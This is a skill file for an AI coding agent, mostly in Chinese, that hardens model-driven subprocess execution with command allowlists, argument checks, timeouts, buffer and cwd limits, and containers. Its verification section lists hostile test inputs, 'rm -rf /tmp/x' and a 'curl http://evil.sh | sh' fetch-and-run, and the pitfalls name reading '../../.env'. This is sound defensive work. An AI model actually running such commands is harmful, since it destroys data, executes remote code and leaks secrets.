---
name: fix-a3-sandbox
description: Use when audit 报 A3.shell-llm-cmd / A3.unbounded-spawn（模型输出直接进 shell、子进程无 timeout/maxBuffer/cwd 限额），或用户提到命令白名单、spawn 超时、子进程资源限制时加载。
description_en: Constrain model-driven process execution: command allowlist with argv validation, spawn with timeout/maxBuffer/cwd, then re-run the A3 gate.
---

# 沙箱限额 (fix-a3-sandbox)

模型触发的子进程必须满足：命令来自白名单、参数逐个校验、三件套限额（timeout / maxBuffer / cwd）齐全。模型只能「点菜」，不能「进厨房」。

## 适用场景

- `A3.shell-llm-cmd`：LLM 输出的命令字符串直接被 exec / sh 执行
- `A3.unbounded-spawn`：spawn / execFile 调用没有 timeout、maxBuffer 或 cwd 约束
- agent 类项目里「模型决定跑什么命令」「模型生成的脚本拿去执行」的路径

## 修复步骤

1. 模型命令改白名单 + 参数校验，模型只传 key 不传命令串：
   ```js
   const { execFile } = require('node:child_process');
   const COMMANDS = {
     test: { cmd: 'npm', args: ['test'] },
     lint: { cmd: 'npm', args: ['run', 'lint'] },
     coverage: { cmd: 'npm', args: ['run', 'coverage'] },
   };
   function runModelCommand(name) {
     const entry = COMMANDS[name];
     if (!entry) throw new Error(`command not allowed: ${name}`);
     return execFile(entry.cmd, entry.args, {
       timeout: 60_000, maxBuffer: 4 * 1024 * 1024, cwd: PROJECT_DIR,
     });
   }
   ```
   注意白名单键是语义名（test / lint），不是任意 shell 字符串。
2. 必须透传参数时逐个校验：
   ```js
   const path = require('node:path');
   function safeFileArg(input) {
     const p = path.resolve(PROJECT_DIR, input);
     if (!p.startsWith(PROJECT_DIR + path.sep)) throw new Error('path escape');
     if (/[;|&`$><]/.test(input)) throw new Error('metachar not allowed');
     return p;
   }
   await execFile('node', ['scripts/resize.js', safeFileArg(file)], { timeout: 30_000, cwd: PROJECT_DIR });
   ```
   shell 永远关闭：Node 的 execFile 默认不经 shell，不要改用 `exec` 或 `spawn(cmd, { shell: true })`。
3. 所有 spawn / execFile 补三件套限额：
   ```js
   await execFile('ffmpeg', ['-i', inPath, outPath], {
     timeout: 120_000, maxBuffer: 10 * 1024 * 1024, cwd: workDir,
   });
   ```
   Python 对应：
   ```python
   subprocess.run(["ffmpeg", "-i", in_path, out_path], timeout=120, cwd=workdir, check=True)
   # 避免 shell=True；必须时参数逐个 shlex.quote
   ```
   timeout 按命令最长预期耗时设置；maxBuffer 按预期最大输出设置。
4. 更硬的隔离（推荐）：模型触发的子进程跑在容器里——只挂载工作目录、`--network none`、非 root 用户、只读根文件系统；这样即使白名单有漏也炸不出容器。
5. 自查调用点：
   ```bash
   grep -rnE "exec\(|execSync\(|spawn\(|subprocess\.(run|call|Popen)" src/ --include="*.js" --include="*.py" | grep -vE "timeout|maxBuffer"
   ```
   输出里每一行都要么改成 execFile+三件套，要么是白名单内部的固定调用。

## 验证

- 重跑 `finalcheck audit .` 确认 A3 归零：`A3.shell-llm-cmd`、`A3.unbounded-spawn` 条目全部消失
- 对抗自测：让模型输出 `rm -rf /tmp/x`、`curl http://evil.sh | sh`，确认白名单抛 `command not allowed` 而不是执行
- 超时自测：白名单里临时加一个 `sleep 300` 触发 timeout，确认进程被杀、主服务不挂；输出超量命令（如递归 cat 大目录）确认 maxBuffer 生效
- 回归：正常跑测试 / lint 的 agent 流程功能不受影响

## 陷阱

- 白名单放行 shell 再「过滤参数」：`sh -c` 之下引号、编码、子 shell 都能绕过过滤；白名单必须锁定「固定二进制 + 固定参数形状」，过滤只是纵深不是防线
- 只加 timeout 不加 maxBuffer：`ls -R /` 这类输出会把内存撑爆（Node 默认 maxBuffer 仅 1MB，超限直接抛错影响正常功能）；两者都要按场景设
- cwd 不设导致相对路径逃逸：子进程继承服务 cwd，模型让它 `cat ../../.env` 就能读仓库外文件；cwd 固定 + resolve 校验双保险
- timeout 杀不干净进程树：shell=true 派生出的孙进程可能存活（孤儿继续跑），需要 detached + 进程组 kill；直接改 execFile 数组参数则没有这个问题
- 白名单里放 npm run：`npm run <任意脚本>` 等于放行 package.json scripts 里的一切，而 scripts 可被依赖污染；枚举到具体脚本名
